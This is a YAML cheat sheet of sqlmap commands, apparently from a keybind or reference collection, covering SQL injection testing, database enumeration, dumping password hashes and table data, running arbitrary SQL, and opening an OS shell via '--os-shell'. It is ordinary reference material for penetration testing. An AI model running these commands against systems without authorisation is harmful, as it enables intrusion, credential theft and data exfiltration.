# https://github.com/cheat/cheatsheets
- name: sqlmap
  keybinds:
  - name: "Test URL and POST data and return database banner (if possible)"
    key: "./sqlmap.py --url=<url> --data=<post-data> --banner"
  - name: "Parse request data and test | request data can be obtained with burp"
    key: "./sqlmap.py -r <request-file> <options>"
  - name: "Fingerprint | much more information than banner"
    key: "./sqlmap.py -r <request-file> --fingerprint"
  - name: "Get database username, name, and hostname"
    key: "./sqlmap.py -r <request-file> --current-user --current-db --hostname"
  - name: "Check if user is a database admin"
    key: "./sqlmap.py -r <request-file> --is-dba"
  - name: "Get database users and password hashes"
    key: "./sqlmap.py -r <request-file> --users --passwords"
  - name: "Enumerate databases"
    key: "./sqlmap.py -r <request-file> --dbs"
  - name: "List tables for one database"
    key: "./sqlmap.py -r <request-file> -D <db-name> --tables"
  - name: "Other database commands"
    key: "./sqlmap.py -r <request-file> -D <db-name> --columns --schema --count"
  - name: "Enumeration flags"
    key: "./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> -U <user-name>"
  - name: "Extract data"
    key: "./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump"
  - name: "Execute SQL Query"
    key: "./sqlmap.py -r <request-file> --sql-query=<sql-query>"
  - name: "Append/Prepend SQL Queries"
    key: "./sqlmap.py -r <request-file> --prefix=<sql-query> --suffix=<sql-query>"
  - name: "Get backdoor access to sql server | can give shell access"
    key: "./sqlmap.py -r <request-file> --os-shell"
